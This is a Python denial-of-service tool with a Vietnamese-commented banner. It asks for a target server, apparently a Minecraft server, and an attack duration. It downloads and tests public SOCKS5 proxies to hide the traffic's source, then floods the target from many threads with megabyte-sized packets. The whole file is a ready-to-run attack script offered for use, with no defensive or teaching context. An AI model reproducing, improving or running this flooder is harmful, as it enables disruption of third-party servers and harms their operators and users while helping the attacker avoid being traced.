import os
import subprocess
import sys
import importlib
import socket
import threading
import time
from datetime import datetime
from colorama import init, Fore, Style
import requests
import socks
import urllib.request
import concurrent.futures

# Danh sách các module cần thiết
required_modules = [
    "requests", "colorama", "pysocks"
]

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        print(f"[+] Module đang được cài đặt.")
        return True
    except ImportError:
        print(f"[-] Module chưa cài. Đang tiến hành cài đặt...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
            print(f"[+] Cài đặt {module_name} thành công!")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[!] Lỗi khi cài {module_name}: {e}")
            return False

def check_required_modules():
    all_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_installed = False
    return all_installed

missing = [m for m in required_modules if not check_and_install_module(m)]
if missing:
    print(f"[!] Không thể cài các module sau: {', '.join(missing)}")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

init()

BANNER = f"""
{Fore.RED}
██╗  ██╗██╗  ██╗███████╗███╗   ██╗
██║ ██╔╝██║ ██╔╝██╔════╝████╗  ██║
█████╔╝ █████╔╝ █████╗  ██╔██╗ ██║
██╔═██╗ ██╔═██╗ ██╔══╝  ██║╚██╗██║
██║  ██╗██║  ██╗███████╗██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
{Style.RESET_ALL}
"""

def get_server_ip(server_address):
    try:
        if ":" in server_address:
            host, port = server_address.rsplit(":", 1)
            port = int(port)
            ip_address = socket.gethostbyname(host)
            print(f"{Fore.GREEN}[+] Extracted IP: {ip_address}, Port: {port}{Style.RESET_ALL}")
            return ip_address, port
        else:
            print(f"{Fore.YELLOW}[i] No port provided, fetching from API...{Style.RESET_ALL}")
            try:
                res = requests.get(f"https://api.mcsrvstat.us/2/{server_address}", timeout=5).json()
                ip = res.get("ip") or socket.gethostbyname(server_address)
                port = int(res.get("port") or 25565)
                return ip, port
            except:
                ip = socket.gethostbyname(server_address)
                return ip, 25565
    except:
        return None, None

def is_socks5_working(proxy, test_host="1.1.1.1", test_port=53, timeout=3):
    try:
        proxy_ip, proxy_port = proxy.split(":")
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        s.settimeout(timeout)
        s.connect((test_host, test_port))
        s.close()
        return True
    except:
        return False

def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event, proxy=None):
    try:
        s = socks.socksocket()
        if proxy:
            proxy_ip, proxy_port = proxy.split(":")
            s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        s.settimeout(3)
        s.connect((server_ip, server_port))
        for i in range(packet_count):
            if stop_event.is_set():
                break
            s.sendall(packet)
            now = datetime.now().strftime("%H:%M:%S")
            print(f"{Fore.CYAN}[{now}] Thread:{thread_id} | Packet: ({i + 1}/{packet_count}){Style.RESET_ALL}")
        s.close()
    except Exception as e:
        now = datetime.now().strftime("%H:%M:%S")
        print(f"{Fore.RED}[{now}] Thread:{thread_id} | Error: {e}{Style.RESET_ALL}")

def stop_after_timeout(stop_event, timeout):
    time.sleep(timeout)
    stop_event.set()
    print(f"{Fore.YELLOW}\n⛔ Stopped after {timeout} seconds{Style.RESET_ALL}")

def run_ski():
    use_proxy = input(f"{Fore.YELLOW}[?] Use proxy? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
    clear_screen()
    print(BANNER)

    try:
        server_address = input(f"{Fore.YELLOW}[+] Target IP [IP:Port or domain]: {Style.RESET_ALL}")
        server_ip, server_port = get_server_ip(server_address)
        if not server_ip:
            raise ValueError("Could not resolve server address")

        timeout = int(input(f"{Fore.YELLOW}[+] Attack duration (seconds): {Style.RESET_ALL}"))
        thread_count = int(input(f"{Fore.YELLOW}[+] Thread count: {Style.RESET_ALL}"))

        proxies = []
        if not use_proxy:
            print(f"{Fore.YELLOW}[!] Proxy disabled. Running without proxies.{Style.RESET_ALL}")
        elif not os.path.exists("proxy_valid.txt"):
            print(f"{Fore.YELLOW}[•] Downloading SOCKS5 proxy list from GitHub...{Style.RESET_ALL}")
            proxy_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
            urllib.request.urlretrieve(proxy_url, "proxy.txt")

            with open("proxy.txt", 'r') as f:
                raw_proxies = [line.strip() for line in f if line.strip()]
            print(f"{Fore.YELLOW}[•] Checking {len(raw_proxies)} SOCKS5 proxies (multi-threaded)...{Style.RESET_ALL}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                results = executor.map(is_socks5_working, raw_proxies)
                proxies = [proxy for proxy, ok in zip(raw_proxies, results) if ok]

            with open("proxy_valid.txt", "w") as f:
                for p in proxies:
                    f.write(p + "\n")

            print(f"{Fore.GREEN}[✓] {len(proxies)} valid SOCKS5 proxies saved to proxy_valid.txt!{Style.RESET_ALL}")
        else:
            with open("proxy_valid.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] Loaded {len(proxies)} SOCKS5 proxies from proxy_valid.txt!{Style.RESET_ALL}")

        if use_proxy and len(proxies) == 0:
            print(f"{Fore.RED}[✘] No valid proxies available. Exiting.{Style.RESET_ALL}")
            return

        packet = b"\x00" * (1024 * 1024)
        packet_count = 100000

        print(f"{Fore.GREEN}[+] Starting attack on {server_ip}:{server_port} with {thread_count} threads...{Style.RESET_ALL}")

        stop_event = threading.Event()
        timer_thread = threading.Thread(target=stop_after_timeout, args=(stop_event, timeout))
        timer_thread.start()

        threads = []
        for i in range(thread_count):
            proxy = proxies[i % len(proxies)] if use_proxy and proxies else None
            t = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i + 1, stop_event, proxy))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"{Fore.GREEN}[✓] Attack completed successfully ✅{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    run_ski()
